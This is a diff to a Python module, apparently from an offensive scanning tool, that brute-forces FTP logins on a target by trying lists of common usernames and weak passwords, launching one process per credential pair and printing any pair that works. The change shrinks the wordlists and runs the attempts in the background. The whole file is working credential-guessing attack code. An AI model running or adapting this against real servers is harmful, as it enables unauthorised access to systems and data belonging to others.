@@ -1,17 +1,18 @@
-import multiprocessing
 from ftplib import FTP
 from mods.mod_utils import *
+import multiprocessing
+from time import sleep
 
 
 # List of common FTP users
 common_ftp_users = [
-    'admin','user','ftp','test','guest','root','administrator','ftpuser','superuser','demo','manager','operator','webmaster','support','sysadmin','backup','developer','office'
+    'admin','user','ftp','test','guest','root','ftpuser','operator','support','backup','developer'
 ]
 
 
 # List of common FTP passwords
 common_ftp_passwords = [
-    '', ' ', 'password','123456','admin','12345','12345678','qwerty','1234567','123456789','1234','password1','abc123','letmein','password123','changeme','123123','login','welcome','test123','ftp123'
+    'password','123456','admin','12345','qwerty','1234','password1','abc123','letmein','password123','changeme','welcome','ftp123'
 ]
 
 def ftp_connect(server, port, username, password):
@@ -24,6 +25,7 @@ def ftp_connect(server, port, username, password):
         ftp.login(user=username, passwd=password)
 
         # Print a message upon successful connection
+        print_banner(port)
         printc(f'[+] FTP Credentials "{username}:{password}"', BLUE)
 
         # Perform operations (e.g., list directories, download/upload files) if needed
@@ -35,40 +37,31 @@ def ftp_connect(server, port, username, password):
         # Close the FTP connection
         ftp.quit()
     except:
-        return
+        pass
+    return
+    
 
 
 def ftp_brute(ip, port):
-    procs = []
     tested_creds = []
-    creds_found =False
 
     for username in common_ftp_users:
-
         for password in get_usernames_esr(username):
-            current_creds = f'{username}:{password}'
+            current_creds = (username,password)
             if current_creds in tested_creds:
                 continue
             tested_creds.append(current_creds)
-
-            process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
-            process.start()
-            procs.append(process)
         for password in common_ftp_passwords:
-            current_creds = f'{username}:{password}'
+            current_creds = (username,password)
             if current_creds in tested_creds:
                 continue
             tested_creds.append(current_creds)
-            
-            # Start processes to execute
-            process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
-            process.start()
-            procs.append(process)
-    procs = launch_procs(procs)
-    if creds_found == False:
-        printc('[-] No common credentials combination found.', RED)
-
-
+    max_creds = len(tested_creds)
+    for username, password in tested_creds:
+        process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
+        process.start()
+    
+    
 def print_this_banner(port):
     print_banner(port)  
     print('[!] FTP')
@@ -88,5 +81,5 @@ def handle_ftp(target, port, nmap_detail):
             printc('[-] Service is exposed but might be Unavailable', RED)
         ftp_connect(target, port, username, 'nopass')        
     else:        
-        printc('[!] Testing common credentials for FTP', YELLOW)
+        printc('[!] Testing common credentials for FTP on background', YELLOW)
         ftp_brute(target, port)
